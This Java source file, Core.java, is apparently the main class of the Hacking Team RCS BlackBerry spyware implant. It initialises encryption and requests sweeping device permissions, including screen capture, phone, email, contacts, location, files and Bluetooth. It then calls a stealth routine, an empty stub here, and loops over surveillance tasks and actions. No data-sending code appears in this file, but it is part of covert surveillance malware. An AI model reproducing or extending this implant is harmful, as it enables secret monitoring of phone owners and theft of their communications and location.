//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : Core.java
 * Created      : 26-mar-2010
 * *************************************************/

package blackberry;

import net.rim.device.api.applicationcontrol.ApplicationPermissions;
import net.rim.device.api.applicationcontrol.ApplicationPermissionsManager;
import net.rim.device.api.system.ApplicationDescriptor;
import blackberry.crypto.Encryption;
import blackberry.utils.Debug;
import blackberry.utils.DebugLevel;
import blackberry.utils.Utils;

// TODO: Auto-generated Javadoc
/**
 * Classe Core, contiene il main.
 */
public final class Core implements Runnable {

    /** The debug instance. */
    //#ifdef DEBUG
    private static Debug debug;
    //#endif
    private static Core instance;

    /**
     * Gets the single instance of Core.
     * 
     * @return single instance of Core
     */
    public static synchronized Core getInstance() {
        if (instance == null) {
            instance = new Core();
        }
        return instance;
    }

    /**
     * Lib main.
     * 
     * @param args
     *            the args
     */
    public static void libMain(final String[] args) {
        final Core core = Core.getInstance();
        core.run();
    }

    /** The task obj. */
    private final Task task;

    /**
     * Instantiates a new core.
     */
    private Core() {

        task = Task.getInstance();
        Utils.sleep(1000);
        // Thread.currentThread().setPriority(Thread.MAX_PRIORITY);

        //#ifdef DEBUG
        Debug.init(Conf.DEBUG_OUT, Conf.DEBUG_SD, Conf.DEBUG_FLASH,
                Conf.DEBUG_EVENTS);
        debug = new Debug("Core", DebugLevel.VERBOSE);
        debug.trace("Core init");
        //#endif

        final boolean antennaInstalled = true;
        //#ifdef DEBUG
        System.out.println("DEBUG");
        //#endif

        //#ifdef DEBUG_TRACE
        System.out.println("DEBUG_TRACE");
        //#endif
        //#ifdef DEBUG_INFO
        System.out.println("DEBUG_INFO");
        //#endif
        //#ifdef DEBUG_WARN
        System.out.println("DEBUG_WARN");
        //#endif
        //#ifdef DEBUG_ERROR
        System.out.println("DEBUG_ERROR");
        //#endif
        //#ifdef DEBUG_FATAL
        System.out.println("DEBUG_FATAL");
        //#endif

        Encryption.init();
    }

    /**
     * This method showcases the ability to check the current permissions for
     * the application. If the permissions are insufficient, the user will be
     * prompted to increase the level of permissions. You may want to restrict
     * permissions for the ApplicationPermissionsDemo.cod module beforehand in
     * order to demonstrate this sample effectively. This can be done in
     * Options/Advanced Options/Applications/(menu)Modules.Highlight
     * 'ApplicationPermissionsDemo' in the Modules list and select 'Edit
     * Permissions' from the menu.
     */
    private void checkPermissions() {

        //#ifdef DEBUG_TRACE
        debug.trace("CheckPermissions");
        //#endif

        // NOTE: This sample leverages the following permissions:
        // --Event Injector
        // --Phone
        // --Device Settings
        // --Email
        // The sample demonstrates how these user defined permissions will
        // cause the respective tests to succeed or fail. Individual
        // applications will require access to different permissions.
        // Please review the Javadocs for the ApplicationPermissions class
        // for a list of all available permissions
        // May 13, 2008: updated permissions by replacing deprecated constants.

        // Capture the current state of permissions and check against the
        // requirements
        final ApplicationPermissionsManager apm = ApplicationPermissionsManager
                .getInstance();
        final ApplicationPermissions original = apm.getApplicationPermissions();

        // Set up and attach a reason provider
        //#ifdef HAVE_REASON_PROVIDER
        final CoreReasonProvider drp = new CoreReasonProvider();
        apm.addReasonProvider(ApplicationDescriptor
                .currentApplicationDescriptor(), drp);
        //#endif

        final int[] wantedPermissions = new int[] {
                ApplicationPermissions.PERMISSION_SCREEN_CAPTURE,
                ApplicationPermissions.PERMISSION_PHONE,
                ApplicationPermissions.PERMISSION_BLUETOOTH,
                ApplicationPermissions.PERMISSION_WIFI,
                ApplicationPermissions.PERMISSION_CODE_MODULE_MANAGEMENT,
                ApplicationPermissions.PERMISSION_PIM,
                ApplicationPermissions.PERMISSION_PHONE,
                ApplicationPermissions.PERMISSION_LOCATION_API,
                ApplicationPermissions.PERMISSION_FILE_API,
                ApplicationPermissions.PERMISSION_MEDIA,
                ApplicationPermissions.PERMISSION_EMAIL };

        //TODO: Dalla 4.6: PERMISSION_INTERNET, PERMISSION_ORGANIZER_DATA, PERMISSION_LOCATION_DATA 

        boolean allPermitted = true;
        for (int i = 0; i < wantedPermissions.length; i++) {
            final int perm = wantedPermissions[i];

            if (original.getPermission(perm) != ApplicationPermissions.VALUE_ALLOW) {
                allPermitted = false;
            }
        }

        if (allPermitted) {
            // All of the necessary permissions are currently available
            //#ifdef DEBUG_INFO
            debug
                    .info("All of the necessary permissions are currently available");
            //#endif
            return;
        }

        // Create a permission request for each of the permissions your
        // application
        // needs. Note that you do not want to list all of the possible
        // permission
        // values since that provides little value for the application or the
        // user.
        // Please only request the permissions needed for your application.
        final ApplicationPermissions permRequest = new ApplicationPermissions();
        for (int i = 0; i < wantedPermissions.length; i++) {
            final int perm = wantedPermissions[i];
            permRequest.addPermission(perm);
        }

        final boolean acceptance = ApplicationPermissionsManager.getInstance()
                .invokePermissionsRequest(permRequest);

        if (acceptance) {
            // User has accepted all of the permissions
            //#ifdef DEBUG_INFO
            debug.info("User has accepted all of the permissions");
            //#endif
            return;
        } else {
            //#ifdef DEBUG
            debug.warn("User has accepted some or none of the permissions");
            //#endif
        }
    }

    /**
     * Run.
     * 
     * @return true, if successful
     */
    public void run() {

        //#ifdef HAVE_PERMISSIONS
        checkPermissions();
        //#endif

        stealth();

        Utils.sleep(500);

        for (;;) {
            //#ifdef DEBUG_INFO
            debug.info("init task");
            //#endif
            if (task.taskInit() == false) {
                //#ifdef DEBUG
                debug.error("TaskInit() FAILED");
                //#endif
                break;
            } else {
                //#ifdef DEBUG_TRACE
                debug.trace("TaskInit() OK");
                //#endif
                // CHECK: Status o init?
            }

            // TODO togliere
            // if (!DeviceInfo.isSimulator()) {
            // debug.warn("TRIGGERING ACTION 0");
            // Status.getInstance().triggerAction(0, null);
            // }

            //#ifdef DEBUG_INFO
            debug.info("starting checking actions");
            //#endif
            if (task.checkActions() == false) {
                //#ifdef DEBUG
                debug.error("CheckActions() [Uninstalling?] FAILED");
                //#endif
                // chiudere tutti i thread
                // decidere se e' un uninstall
                break;
            } else {
                //#ifdef DEBUG_INFO
                debug.info("Waiting a while before reloading");
                //#endif
                Utils.sleep(2000);
            }
        }

        //#ifdef DEBUG_TRACE
        debug.trace("RCSBlackBerry exit ");
        //#endif

        //#ifdef DEBUG
        Debug.stop();
        //#endif

        Utils.sleep(2000);
        System.exit(0);
    }

    /**
     * Stealth.
     */
    private void stealth() {
        // TODO Auto-generated method stub
    }

}
